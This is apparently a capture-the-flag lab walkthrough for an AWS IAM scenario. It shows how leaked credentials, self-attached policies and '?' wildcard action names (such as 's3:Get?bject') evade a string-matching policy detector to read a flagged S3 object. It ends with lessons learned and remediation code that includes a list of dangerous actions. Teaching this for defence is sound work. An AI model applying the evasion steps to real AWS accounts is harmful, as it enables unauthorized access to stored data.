# Walkthrough

## Step 1: Identity Confirmation

Verify who you are with the leaked credentials.

```bash
aws sts get-caller-identity --profile attacker
```

You are an IAM user under `gnawlab/gnawlab-iampoly-attacker-xxxxxxxx`.

## Step 2: Permission Enumeration

Always enumerate every permission source: user inline, user attached, group membership, group inline, group attached.

```bash
USER_NAME="gnawlab-iampoly-attacker-xxxxxxxx"

# User inline policies
aws iam list-user-policies --user-name "$USER_NAME" --profile attacker
```

Output:

```json
{
    "PolicyNames": [
        "gnawlab-iampoly-attacker-policy-xxxxxxxx"
    ]
}
```

```bash
# Read the inline policy contents
aws iam get-user-policy \
  --user-name "$USER_NAME" \
  --policy-name gnawlab-iampoly-attacker-policy-xxxxxxxx \
  --profile attacker
```

Output (excerpt):

```json
{
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {"Sid": "IdentityVerification", "Effect": "Allow", "Action": ["sts:GetCallerIdentity"], "Resource": "*"},
            {"Sid": "SelfEnumeration", "Effect": "Allow", "Action": ["iam:GetUser", "iam:ListUserPolicies", "iam:GetUserPolicy", "iam:ListAttachedUserPolicies", "iam:ListGroupsForUser", "iam:ListGroupPolicies", "iam:ListAttachedGroupPolicies", "iam:GetGroupPolicy"], "Resource": ["arn:aws:iam::123456789012:user/gnawlab/gnawlab-iampoly-attacker-xxxxxxxx", "arn:aws:iam::123456789012:group/*"]},
            {"Sid": "PolicyCreationAndSelfAttach", "Effect": "Allow", "Action": ["iam:CreatePolicy", "iam:GetPolicy", "iam:GetPolicyVersion", "iam:ListPolicyVersions"], "Resource": "*"},
            {"Sid": "AttachOwnedPolicy", "Effect": "Allow", "Action": ["iam:AttachUserPolicy"], "Resource": "arn:aws:iam::123456789012:user/gnawlab/gnawlab-iampoly-attacker-xxxxxxxx"}
        ]
    }
}
```

```bash
# User attached managed policies
aws iam list-attached-user-policies --user-name "$USER_NAME" --profile attacker

# Group memberships
aws iam list-groups-for-user --user-name "$USER_NAME" --profile attacker
```

Both return empty (`AttachedPolicies: []`, `Groups: []`). The user has no group memberships and no managed policies.

**Findings:**
- Identity / self-enumeration permissions only.
- `iam:CreatePolicy` (any policy) + `iam:AttachUserPolicy` (self only) — the only privilege escalation primitive available.
- No direct S3 access.

## Step 3: Reconnaissance - Discover the Detector

Try a "naive" policy to see how the detection system reacts.

```bash
cat > /tmp/naive-list.json <<'JSON'
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": "s3:ListAllMyBuckets",
    "Resource": "*"
  }]
}
JSON
```

```bash
aws iam create-policy \
  --policy-name naive-list \
  --policy-document file:///tmp/naive-list.json \
  --profile attacker
```

The policy is created. Wait 30-60 seconds, then check again:

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --profile attacker --query Account --output text)
aws iam get-policy \
  --policy-arn "arn:aws:iam::${ACCOUNT_ID}:policy/naive-list" \
  --profile attacker
```

`NoSuchEntity` confirms the detection Lambda deleted the policy. The detector reads `CreatePolicy` events from CloudTrail (via EventBridge) and inspects the policy JSON for blocked literal strings. `"s3:ListAllMyBuckets"` is one of them.

## Step 4: Exploit Phase 1 - Bucket Enumeration via Wildcard Obfuscation

AWS IAM evaluates `?` and `*` characters as wildcards **inside the action name portion only** (the part after the colon). The vendor portion (before the colon) must be a literal name like `s3`; AWS rejects policies with wildcards in the vendor (`MalformedPolicyDocument: Action vendors must not contain wildcards`).

The detector's literal pattern `"s3:ListAllMyBuckets"` does not match the string `"s3:List?llMyBuckets"`, but the IAM engine resolves the latter to `s3:ListAllMyBuckets` semantically.

Pattern derivation:

```
s3:List?llMyBuckets
^^                   s3 literal vendor
  ^^^^^              :List literal
       ^             ?  -> A
        ^^^^^^^^^^^  llMyBuckets literal
                   = s3:ListAllMyBuckets
```

```bash
cat > /tmp/list-bypass.json <<'JSON'
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": "s3:List?llMyBuckets",
    "Resource": "*"
  }]
}
JSON
```

```bash
LIST_ARN=$(aws iam create-policy \
  --policy-name list-bypass \
  --policy-document file:///tmp/list-bypass.json \
  --profile attacker \
  --query 'Policy.Arn' --output text)

echo "$LIST_ARN"
```

Wait 30-60 seconds and confirm the policy is still alive:

```bash
aws iam get-policy --policy-arn "$LIST_ARN" --profile attacker
```

The policy survives. Attach it to your own user:

```bash
aws iam attach-user-policy \
  --user-name "$USER_NAME" \
  --policy-arn "$LIST_ARN" \
  --profile attacker
```

> **Note:** IAM permission propagation typically takes 30-60 seconds after attaching a policy. If `aws s3 ls` returns `AccessDenied` immediately after attach, wait another minute and retry.

Now enumerate buckets:

```bash
sleep 60
aws s3 ls --profile attacker
```

The flag bucket name is now visible (`gnawlab-iampoly-flag-xxxxxxxx`).

## Step 5: Reconnaissance - Confirm GetObject Literal Is Blocked

Repeat the detector test for the action that actually reads the flag.

```bash
FLAG_BUCKET="gnawlab-iampoly-flag-xxxxxxxx"

cat > /tmp/naive-get.json <<JSON
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": "s3:GetObject",
    "Resource": "arn:aws:s3:::${FLAG_BUCKET}/*"
  }]
}
JSON
```

```bash
aws iam create-policy \
  --policy-name naive-get \
  --policy-document file:///tmp/naive-get.json \
  --profile attacker
```

Wait 30-60 seconds, then verify deletion:

```bash
aws iam get-policy \
  --policy-arn "arn:aws:iam::${ACCOUNT_ID}:policy/naive-get" \
  --profile attacker
```

`NoSuchEntity` confirms `"s3:GetObject"` is also on the detector's literal block list.

## Step 6: Exploit Phase 2 - Read the Flag via Wildcard Obfuscation

Use the wildcard-obfuscated equivalent (vendor stays literal `s3:`, action name uses `?`):

```
s3:Get?bject
^^             s3 literal vendor
  ^^^^         :Get literal
      ^        ?  -> O
       ^^^^^   bject literal
              = s3:GetObject
```

```bash
cat > /tmp/get-bypass.json <<JSON
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": "s3:Get?bject",
    "Resource": "arn:aws:s3:::${FLAG_BUCKET}/*"
  }]
}
JSON
```

```bash
GET_ARN=$(aws iam create-policy \
  --policy-name get-bypass \
  --policy-document file:///tmp/get-bypass.json \
  --profile attacker \
  --query 'Policy.Arn' --output text)
```

Wait 30-60 seconds and confirm the policy survives:

```bash
aws iam get-policy --policy-arn "$GET_ARN" --profile attacker
```

Attach it to your own user:

```bash
aws iam attach-user-policy \
  --user-name "$USER_NAME" \
  --policy-arn "$GET_ARN" \
  --profile attacker
```

## Step 7: Capture the Flag

Wait for IAM permission propagation, then read the flag:

```bash
sleep 60
aws s3 cp "s3://${FLAG_BUCKET}/flag.txt" - --profile attacker
```

Output:

```
FLAG{iam_wildcard_obfuscation_bypass_complete}
```

---

## Attack Chain Summary

```
1. Leaked Access Key
   ↓ sts:GetCallerIdentity — confirm IAM user identity
2. Permission Enumeration
   ↓ iam:ListUserPolicies / iam:GetUserPolicy / iam:ListAttachedUserPolicies / iam:ListGroupsForUser
3. Detection Reconnaissance — ListAllMyBuckets
   ↓ Create literal s3:ListAllMyBuckets policy — deleted by Lambda
4. Wildcard Obfuscation — Bucket Enumeration
   ↓ Create policy with Action: s3:List?llMyBuckets (IAM resolves to s3:ListAllMyBuckets)
   ↓ Survives detector, iam:AttachUserPolicy to self
   ↓ s3:ListAllMyBuckets — discover flag bucket name
5. Detection Reconnaissance — GetObject
   ↓ Create literal s3:GetObject policy — deleted by Lambda
6. Wildcard Obfuscation — Object Read
   ↓ Create policy with Action: s3:Get?bject (IAM resolves to s3:GetObject)
   ↓ Survives detector, iam:AttachUserPolicy to self
   ↓ s3:GetObject on flag.txt
7. FLAG{iam_wildcard_obfuscation_bypass_complete}
```

---

## Key Techniques

### IAM Action Wildcards

AWS IAM Action values support two wildcard characters **inside the action name portion** (the part after the colon):

| Character | Meaning |
|-----------|---------|
| `*` | Matches any sequence of zero or more characters |
| `?` | Matches exactly one character |

The service vendor portion (before the colon) must be a literal name like `s3`, `ec2`, etc. AWS rejects policies that contain wildcards in the vendor with `MalformedPolicyDocument: Action vendors must not contain wildcards`. The exceptions are the special forms `*` and `*:*`, which AWS accepts as full wildcards.

IAM also matches Action values **case-insensitively** in the vendor portion (`s3` and `S3` are equivalent). The IAM engine resolves wildcards before evaluating an authorization decision, so `s3:Get?bject` and `s3:GetObject` are semantically equivalent.

### Why the Detector Fails

The detection Lambda searches the policy JSON document for blocked literal strings using `re.search(pattern, policy_str, re.IGNORECASE)`. Case-insensitive matching neutralizes trivial bypasses such as `S3:GetObject`. The Lambda also blocks common verb-prefix wildcards like `s3:Get*` and `s3:List*`. However, the detector cannot match the literal `"s3:GetObject"` against the string `"s3:Get?bject"` — the `?` is not the literal character `O`.

The IAM engine and the detector evaluate the Action string at different layers:

| Layer | Sees `s3:Get?bject` as |
|-------|-----------------------|
| Detector (string match) | Different from any blocked literal |
| IAM engine (semantic) | Equal to `s3:GetObject` |

---

## Lessons Learned

### 1. String Detection Is Insufficient

Pattern-based detection cannot represent the full set of strings that resolve to a dangerous action under IAM wildcard rules. Any non-trivial literal can be obfuscated by replacing one or more characters with `?`.

### 2. Use Semantic Validation

```python
# Bad: literal pattern check
re.search(r'"s3:GetObject"', policy_str, re.IGNORECASE)

# Better: enumerate the action under IAM wildcard semantics
import fnmatch

DANGEROUS_ACTIONS = ["s3:GetObject", "s3:ListAllMyBuckets", ...]

def resolves_to_dangerous(action: str) -> bool:
    return any(
        fnmatch.fnmatchcase(target.lower(), action.lower())
        for target in DANGEROUS_ACTIONS
    )

# Best: IAM ValidatePolicy / Access Analyzer
import boto3
accessanalyzer = boto3.client('accessanalyzer')
accessanalyzer.validate_policy(
    policyDocument=policy_str,
    policyType='IDENTITY_POLICY'
)
```

### 3. Constrain Resource ARNs in IAM Policies

Even when the Action is correctly evaluated, scoping the Resource field to a precise ARN limits damage. The least-privilege practice for `iam:AttachUserPolicy` is to constrain `Resource` to the specific user (as this scenario does).

### 4. Defense in Depth

- Pair real-time pattern detection with **AWS Access Analyzer** scheduled scans.
- Use **SCPs** at the AWS Organizations level (or **IAM Permission Boundaries** for single-account environments, as this scenario does) to deny dangerous actions outright (`iam:CreateUser`, `iam:PassRole`, `lambda:UpdateFunctionCode`, `cloudtrail:StopLogging`, etc.). These cannot inspect policy documents, but they prevent unrelated escalation paths so detection logic can stay focused on its true target.
- Monitor `iam:CreatePolicy` and `iam:AttachUserPolicy` with high signal-to-noise alerts and require human review when wildcards appear in Action values.

---

## Remediation

### Replace Pattern Match With Semantic Check

```python
import fnmatch
import json

DANGEROUS_ACTIONS = [
    "s3:GetObject",
    "s3:GetObjectVersion",
    "s3:ListAllMyBuckets",
    "s3:ListBucket",
    "secretsmanager:GetSecretValue",
    "iam:CreateAccessKey",
    "iam:PassRole",
]

def expand_actions(statement_actions):
    if isinstance(statement_actions, str):
        return [statement_actions]
    return list(statement_actions)

def is_dangerous(policy_document):
    for stmt in policy_document.get("Statement", []):
        if stmt.get("Effect") != "Allow":
            continue
        actions = expand_actions(stmt.get("Action", []))
        for action in actions:
            for target in DANGEROUS_ACTIONS:
                # IAM wildcard semantics: case-insensitive fnmatch
                if fnmatch.fnmatchcase(target.lower(), action.lower()):
                    return True
    return False
```

### Use AWS Access Analyzer ValidatePolicy

```python
import boto3

accessanalyzer = boto3.client("accessanalyzer")
result = accessanalyzer.validate_policy(
    policyDocument=json.dumps(policy_document),
    policyType="IDENTITY_POLICY",
)

for finding in result.get("findings", []):
    if finding["findingType"] in ("ERROR", "SECURITY_WARNING"):
        # Reject the policy
        ...
```
